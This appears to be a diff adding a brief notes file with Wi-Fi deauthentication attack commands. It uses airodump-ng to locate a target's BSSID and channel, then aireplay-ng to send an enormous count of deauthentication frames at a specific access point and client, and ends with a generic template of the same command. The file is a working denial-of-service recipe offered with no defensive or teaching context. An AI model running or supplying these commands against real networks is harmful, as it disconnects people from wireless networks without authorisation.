@@ -1,0 +1,7 @@
+1. sudo airodump-ng wlan0mon
+find the bssid and channel for which you have to deauthenticate 
+
+2.sudo aireplay-ng --deauth 100000000000 -a AC:84:C6:E6:40:73 -c 24:92:0E:41:91:02 wlan0mon
+
+
+sudo aireplay-ng --deauth 10000000000 -a BSSID -c MAC address adapter name
